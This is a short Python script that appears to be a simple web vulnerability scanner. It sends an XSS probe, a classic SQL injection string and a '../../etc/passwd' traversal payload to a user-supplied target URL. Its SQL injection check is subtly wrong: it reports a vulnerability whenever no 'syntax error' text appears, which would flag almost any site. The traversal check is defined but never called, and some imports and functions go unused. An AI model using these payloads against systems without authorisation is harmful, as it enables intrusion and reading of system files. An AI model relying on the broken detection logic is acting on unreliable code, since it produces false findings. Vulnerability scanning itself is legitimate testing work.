import requests 
import json
from bs4 import BeautifulSoup


def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url, params={"q": payload})
    if payload in response.text:
        print(f"[!] XSS Vulnerability Found: {url}")
    else:
        print(f"[+] No XSS Vulnerability: {url}")


def check_sql_injection(url):
    payload = "' OR '1' = '1"
    response = requests.get(url, params={"id": payload})
    if "syntax error" not in response.text.lower():
        print(f"[!] SQL Injection Vulnerability Found: {url}")
    else:
        print(f"[+] No SQL Injection Vulnerability: {url}")


def check_directory_traversal(url):
    payload = "../../etc/passwd"
    response = requests.get(url, params={"file": payload})
    if "root:" in response.text:
        print(f"[!] Directory Traversal Vulnerabilty Found: {url}")
    else:
        print(f"[+] No Directory Traversal Vulnerability Found: {url}")


def save_report(data, filename="report.json"):
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)
    print(f"[+] Report saved to {filename}")



if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    print(f"Scanning {target_url}...")
    check_xss(target_url)
    check_sql_injection(target_url)


